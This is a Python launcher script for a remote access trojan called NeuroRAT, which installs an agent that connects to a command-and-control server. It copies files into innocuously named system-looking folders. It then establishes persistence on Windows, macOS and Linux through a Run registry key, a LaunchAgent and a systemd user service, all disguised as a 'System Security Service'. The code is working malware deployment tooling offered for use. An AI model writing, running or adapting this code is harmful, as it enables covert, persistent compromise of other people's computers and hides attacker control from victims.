#!/usr/bin/env python3
"""
NeuroRAT Launcher - Tool for deploying NeuroRAT agents easily
"""

import os
import sys
import time
import json
import base64
import argparse
import subprocess
import tempfile
import platform
import logging
import urllib.request
from typing import Dict, Any, List, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('neurorat_launcher.log')
    ]
)
logger = logging.getLogger('neurorat_launcher')

class NeuroRATLauncher:
    """Tool for deploying NeuroRAT agents"""
    
    def __init__(self):
        """Initialize the launcher"""
        self.required_files = [
            "neurorat_agent.py",
            "llm_processor.py"
        ]
        
        # Operating system specific information
        self.os_type = platform.system()
        
        # Installation paths
        if self.os_type == "Windows":
            self.install_dir = os.path.join(os.environ.get("APPDATA", ""), "SystemServices")
        elif self.os_type == "Darwin":  # macOS
            self.install_dir = os.path.join(os.path.expanduser("~"), "Library", "Application Support", "SystemServices")
        else:  # Linux/Unix
            self.install_dir = os.path.join(os.path.expanduser("~"), ".config", "system-services")
    
    def check_dependencies(self) -> bool:
        """Check if all required dependencies are installed"""
        try:
            # Basic dependencies
            import socket
            import platform
            import uuid
            
            # Check if agent_protocol is available
            try:
                sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
                from agent_protocol.agent import Agent
                return True
            except ImportError:
                logger.error("agent_protocol module not found. Please ensure it's in the correct location.")
                return False
                
        except ImportError as e:
            logger.error(f"Missing dependency: {str(e)}")
            return False
    
    def check_files(self) -> bool:
        """Check if all required files exist"""
        for file in self.required_files:
            if not os.path.exists(file):
                logger.error(f"Required file not found: {file}")
                return False
        return True
    
    def install(self, server_host: str, server_port: int, 
               with_persistence: bool = False) -> bool:
        """Install the NeuroRAT agent"""
        logger.info(f"Installing NeuroRAT agent to connect to {server_host}:{server_port}")
        
        # Create installation directory if it doesn't exist
        os.makedirs(self.install_dir, exist_ok=True)
        
        # Copy required files
        for file in self.required_files:
            src_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), file)
            dst_path = os.path.join(self.install_dir, file)
            
            with open(src_path, 'r') as src, open(dst_path, 'w') as dst:
                dst.write(src.read())
            
            # Make executable
            os.chmod(dst_path, 0o755)
        
        # Also copy agent_protocol folder if it exists
        agent_protocol_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent_protocol")
        if os.path.exists(agent_protocol_path) and os.path.isdir(agent_protocol_path):
            dest_agent_protocol = os.path.join(self.install_dir, "agent_protocol")
            self._copy_directory(agent_protocol_path, dest_agent_protocol)
        
        # Create launcher script with specified server information
        self._create_launcher_script(server_host, server_port, with_persistence)
        
        # Set up persistence if requested
        if with_persistence:
            self._setup_persistence(server_host, server_port)
        
        logger.info(f"Installation completed in {self.install_dir}")
        return True
    
    def _copy_directory(self, src: str, dst: str) -> None:
        """Copy directory recursively"""
        os.makedirs(dst, exist_ok=True)
        
        for item in os.listdir(src):
            src_item = os.path.join(src, item)
            dst_item = os.path.join(dst, item)
            
            if os.path.isdir(src_item):
                self._copy_directory(src_item, dst_item)
            else:
                # Copy file
                with open(src_item, 'rb') as src_file, open(dst_item, 'wb') as dst_file:
                    dst_file.write(src_file.read())
    
    def _create_launcher_script(self, server_host: str, server_port: int, 
                               with_persistence: bool) -> None:
        """Create a launcher script"""
        launcher_path = os.path.join(self.install_dir, "launch.py")
        
        persistence_flag = "--persistence" if with_persistence else ""
        
        launcher_content = f"""#!/usr/bin/env python3
import os
import sys
import subprocess

# Add the current directory to sys.path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Launch the agent
if __name__ == "__main__":
    # Set working directory
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    # Import the agent module
    from neurorat_agent import main as agent_main
    
    # Run the agent
    sys.argv = ["neurorat_agent.py", "--server", "{server_host}", "--port", "{server_port}", "{persistence_flag}"]
    agent_main()
"""
        
        with open(launcher_path, 'w') as f:
            f.write(launcher_content)
        
        # Make executable
        os.chmod(launcher_path, 0o755)
    
    def _setup_persistence(self, server_host: str, server_port: int) -> None:
        """Set up persistence based on the operating system"""
        logger.info(f"Setting up persistence for {self.os_type}")
        
        launcher_path = os.path.join(self.install_dir, "launch.py")
        python_exec = sys.executable
        
        if self.os_type == "Windows":
            # Windows persistence via Registry
            try:
                import winreg
                
                # Command to run
                run_command = f'"{python_exec}" "{launcher_path}"'
                
                # Add to Run registry for current user
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
                winreg.SetValueEx(key, "SystemSecurityService", 0, winreg.REG_SZ, run_command)
                winreg.CloseKey(key)
                
                logger.info("Windows persistence established via Registry")
            except Exception as e:
                logger.error(f"Failed to set up Windows persistence: {str(e)}")
                
        elif self.os_type == "Darwin":  # macOS
            # macOS persistence via Launch Agent
            try:
                launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
                os.makedirs(launch_agents_dir, exist_ok=True)
                
                plist_path = os.path.join(launch_agents_dir, "com.system.security.plist")
                
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.security</string>
    <key>ProgramArguments</key>
    <array>
        <string>{python_exec}</string>
        <string>{launcher_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
                
                with open(plist_path, 'w') as f:
                    f.write(plist_content)
                
                # Load the launch agent
                subprocess.run(["launchctl", "load", plist_path], check=False)
                
                logger.info("macOS persistence established via Launch Agent")
            except Exception as e:
                logger.error(f"Failed to set up macOS persistence: {str(e)}")
                
        else:  # Linux/Unix
            # Linux persistence via systemd user service
            try:
                systemd_dir = os.path.expanduser("~/.config/systemd/user")
                os.makedirs(systemd_dir, exist_ok=True)
                
                service_path = os.path.join(systemd_dir, "system-security.service")
                
                service_content = f"""[Unit]
Description=System Security Service
After=network.target

[Service]
Type=simple
ExecStart={python_exec} {launcher_path}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
                
                with open(service_path, 'w') as f:
                    f.write(service_content)
                
                # Enable and start the service
                subprocess.run(["systemctl", "--user", "enable", "system-security.service"], check=False)
                subprocess.run(["systemctl", "--user", "start", "system-security.service"], check=False)
                
                logger.info("Linux persistence established via systemd user service")
            except Exception as e:
                logger.error(f"Failed to set up Linux persistence: {str(e)}")
    
    def run_agent(self, server_host: str, server_port: int, with_persistence: bool = False) -> None:
        """Run the agent directly without installation"""
        logger.info(f"Running NeuroRAT agent connecting to {server_host}:{server_port}")
        
        # Import the agent module
        try:
            from neurorat_agent import NeuroRATAgent
            
            # Create and start the agent
            agent = NeuroRATAgent(
                server_host=server_host,
                server_port=server_port,
                persistence=with_persistence
            )
            
            # Start the agent
            agent.start()
            
            # Keep the main thread running
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                logger.info("Keyboard interrupt received, stopping agent")
            finally:
                agent.stop()
                
        except ImportError:
            logger.error("Failed to import NeuroRATAgent. Make sure neurorat_agent.py is in the current directory.")
            sys.exit(1)
    
    def uninstall(self) -> bool:
        """Uninstall the NeuroRAT agent"""
        logger.info("Uninstalling NeuroRAT agent")
        
        if not os.path.exists(self.install_dir):
            logger.info("Nothing to uninstall - installation directory not found")
            return True
        
        # Remove persistence first
        self._remove_persistence()
        
        # Remove installation directory
        try:
            import shutil
            shutil.rmtree(self.install_dir)
            logger.info(f"Removed installation directory: {self.install_dir}")
            return True
        except Exception as e:
            logger.error(f"Failed to remove installation directory: {str(e)}")
            return False
    
    def _remove_persistence(self) -> None:
        """Remove persistence based on the operating system"""
        logger.info(f"Removing persistence for {self.os_type}")
        
        if self.os_type == "Windows":
            # Windows - remove from Registry
            try:
                import winreg
                
                # Remove from Run registry
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                try:
                    winreg.DeleteValue(key, "SystemSecurityService")
                    logger.info("Removed Windows Registry persistence")
                except FileNotFoundError:
                    pass
                finally:
                    winreg.CloseKey(key)
            except Exception as e:
                logger.error(f"Failed to remove Windows persistence: {str(e)}")
                
        elif self.os_type == "Darwin":  # macOS
            # macOS - remove Launch Agent
            try:
                plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.security.plist")
                
                if os.path.exists(plist_path):
                    # Unload the launch agent
                    subprocess.run(["launchctl", "unload", plist_path], check=False)
                    
                    # Remove the plist file
                    os.remove(plist_path)
                    
                    logger.info("Removed macOS Launch Agent persistence")
            except Exception as e:
                logger.error(f"Failed to remove macOS persistence: {str(e)}")
                
        else:  # Linux/Unix
            # Linux - remove systemd user service
            try:
                service_path = os.path.expanduser("~/.config/systemd/user/system-security.service")
                
                if os.path.exists(service_path):
                    # Stop and disable the service
                    subprocess.run(["systemctl", "--user", "stop", "system-security.service"], check=False)
                    subprocess.run(["systemctl", "--user", "disable", "system-security.service"], check=False)
                    
                    # Remove the service file
                    os.remove(service_path)
                    
                    logger.info("Removed Linux systemd user service persistence")
            except Exception as e:
                logger.error(f"Failed to remove Linux persistence: {str(e)}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description="NeuroRAT Launcher")
    
    # Command subparsers
    subparsers = parser.add_subparsers(dest="command", help="Command to execute")
    
    # Install command
    install_parser = subparsers.add_parser("install", help="Install NeuroRAT agent")
    install_parser.add_argument("--server", required=True, help="C2 server host")
    install_parser.add_argument("--port", type=int, required=True, help="C2 server port")
    install_parser.add_argument("--persistence", action="store_true", help="Establish persistence")
    
    # Run command
    run_parser = subparsers.add_parser("run", help="Run NeuroRAT agent")
    run_parser.add_argument("--server", required=True, help="C2 server host")
    run_parser.add_argument("--port", type=int, required=True, help="C2 server port")
    run_parser.add_argument("--persistence", action="store_true", help="Establish persistence")
    
    # Uninstall command
    subparsers.add_parser("uninstall", help="Uninstall NeuroRAT agent")
    
    # Parse arguments
    args = parser.parse_args()
    
    # Initialize launcher
    launcher = NeuroRATLauncher()
    
    # Execute command
    if args.command == "install":
        # Check dependencies and files
        if not launcher.check_dependencies():
            print("Error: Missing dependencies. Please fix the issues and try again.")
            sys.exit(1)
        
        if not launcher.check_files():
            print("Error: Missing required files. Please ensure all files are present.")
            sys.exit(1)
        
        # Install the agent
        if launcher.install(args.server, args.port, args.persistence):
            print(f"NeuroRAT agent successfully installed and configured to connect to {args.server}:{args.port}")
        else:
            print("Error: Failed to install NeuroRAT agent.")
            sys.exit(1)
            
    elif args.command == "run":
        # Check dependencies and files
        if not launcher.check_dependencies():
            print("Error: Missing dependencies. Please fix the issues and try again.")
            sys.exit(1)
        
        if not launcher.check_files():
            print("Error: Missing required files. Please ensure all files are present.")
            sys.exit(1)
        
        # Run the agent
        launcher.run_agent(args.server, args.port, args.persistence)
        
    elif args.command == "uninstall":
        # Uninstall the agent
        if launcher.uninstall():
            print("NeuroRAT agent successfully uninstalled.")
        else:
            print("Error: Failed to completely uninstall NeuroRAT agent.")
            sys.exit(1)
            
    else:
        parser.print_help()
        sys.exit(1)


if __name__ == "__main__":
    main() 